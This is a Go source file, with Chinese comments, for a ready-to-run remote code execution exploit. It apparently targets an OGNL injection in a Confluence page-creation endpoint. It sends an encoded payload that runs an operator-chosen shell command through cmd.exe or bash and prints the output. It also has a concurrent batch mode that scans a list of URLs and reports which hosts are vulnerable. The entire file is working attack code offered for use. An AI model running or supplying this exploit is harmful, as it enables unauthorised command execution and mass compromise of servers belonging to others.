/*
cmd命令:
    go run main.go -args
    args
        -u url
        -l url.txt
        -c Command 
*/

package main

import (
	"bufio"
	"compress/gzip"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)

func exec(targetURL, runCommand string, isbatch bool) {

	PostData := `queryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022` + runCommand + `%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027`

	/*构造payload*/
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(targetURL, "http") {
		targetURL = "http://" + targetURL
	}

	request, err := http.NewRequest(http.MethodPost, targetURL+"/pages/createpage-entervariables.action?SpaceKey=x", strings.NewReader(PostData))
	if err != nil {
		fmt.Println(err)
	}
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0")
	request.Header.Add("Connection", "close")

	request.Header.Add("Accept-Encoding", "gzip, deflate")
	request.Header.Add("Accept", "*/*")

	do, err := cli.Do(request)
	if err != nil {
		return
	}
	defer func() {
		_ = do.Body.Close()
	}()

	gread, err := gzip.NewReader(do.Body)
	if err == nil {
		ioread, err := ioutil.ReadAll(gread)

		if err == nil {
			if isbatch {
				if strings.Contains(string(ioread), "aaaaaaaa") {
					fmt.Printf("%s 存在漏洞\n", targetURL)
				}
			}else {
				fmt.Println(Between(string(ioread),"aaaaaaaa[","]"))

			}
		}
	}
}
func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func main() {
	var wg sync.WaitGroup

	var targetURL, runCommand, filepath string

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.StringVar(&runCommand, "c", "", "")
	flag.CommandLine.Usage = func() { fmt.Println("使用说明：\n执行命令：./main -u http://127.0.0.1:8080 -c whoami\n批量检测：./main -l url.txt ") }

	flag.Parse()

	if len(targetURL) == 0 {

		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()
		buf := bufio.NewReader(file)
		for {
			wg.Add(1)
			line, err := buf.ReadString('\n')
			line = strings.TrimSpace(line)
			a := line
			go func() {
				exec(a, "echo test", true)
				wg.Done()
			}()
			if err != nil {
				if err == io.EOF {
					break
				} else {
					fmt.Println("Read file error!", err)
					return
				}
			}
		}
	} else {
		exec(targetURL, runCommand, false)
	}
	wg.Wait()
}
